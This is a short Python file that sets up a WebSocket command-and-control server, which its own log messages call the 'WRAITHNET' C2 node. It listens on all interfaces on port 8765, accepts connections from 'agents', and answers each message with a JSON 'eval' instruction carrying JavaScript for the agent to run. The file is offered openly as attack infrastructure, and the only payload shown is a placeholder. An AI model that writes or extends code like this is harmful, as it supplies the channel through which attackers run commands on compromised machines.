
import asyncio
import websockets

async def handler(websocket):
    print("[📡] Agent connected.")
    async for message in websocket:
        print(f"[💬] Received: {message}")
        await websocket.send('{"eval": "console.log(\'C2 live\')"}')

def initiate_c2_session():
    print("[📡] Starting Command & Control (WRAITHNET node)...")
    try:
        start_server = websockets.serve(handler, "0.0.0.0", 8765)
        asyncio.get_event_loop().run_until_complete(start_server)
        print("[✔️] WRAITHNET C2 online at ws://0.0.0.0:8765")
    except Exception as e:
        print("[❌] C2 error:", e)
